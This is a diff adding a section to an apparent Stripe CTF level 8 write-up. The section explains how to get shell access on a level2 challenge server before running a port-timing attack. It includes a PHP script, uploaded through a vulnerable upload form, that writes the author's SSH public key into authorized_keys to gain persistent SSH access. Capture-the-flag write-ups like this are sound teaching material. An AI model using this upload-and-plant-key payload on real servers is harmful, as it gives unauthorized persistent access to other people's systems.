@@ -96,3 +96,26 @@ But there's jitter!
 -------------------
 
 Jitter should only increase the port difference. If you don't get a 2, keep trying. My code stops after it gets several 3 responses.
+
+Exploiting this in production
+-----------------------------
+
+First, you need access to SSH on a level2 server. You do this by going back to level2's vulnerable upload script, and uploading a script which lets you add your own SSH key to authorized_keys:
+```php
+<?php
+
+$my_key = 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCl5m6cUBAIo9BUFRZjwWze68qN9xvrLRMs+OlAyoi3VTzT+QHnCeTkLUL/V2raCjrbtJGNOgANtJ7m+/17FxKQ9+MNPBiGCR7nPWJ2EQDSh8h4A5NWwwTdVPWBmlBN40d8ni6JjlXFm/D+hoBxUxaRBjYQpi5N9GpdDK4GAQHuSb3pJob+ANGeV4LvWBzmlCp6mZf63yljLtPMTXRT58XAe4D4kMUdh59tDpr9dmpsqPtxW/9fXJgQdgpa4kGrj+UkaPj+GkZemneUq6Ih200vZL90MIGzZcJ4as4EKtpXbfo8M+YMZ53i2RA1ZzEcrZ/77ls31l9GWBMEY91IwbbB lukegb@lukegb.com';
+
+mkdir("../../.ssh");
+chmod("../../.ssh", 0700);
+file_put_contents("../../.ssh/authorized_keys", $my_key);
+chmod("../../.ssh/authorized_keys", 0600);
+
+?>
+```
+
+and then run that. You now have ssh access to user-__userstring__@level02-__servernumber__.stripe-ctf.com - hooray!
+
+Next, you need to write a script to make outgoing calls to the PServer and receive webhooks and their associated outbound port numbers. I did this in Go, and you can find it in the level08 folder in this git repository.
+
+Finally: run it!
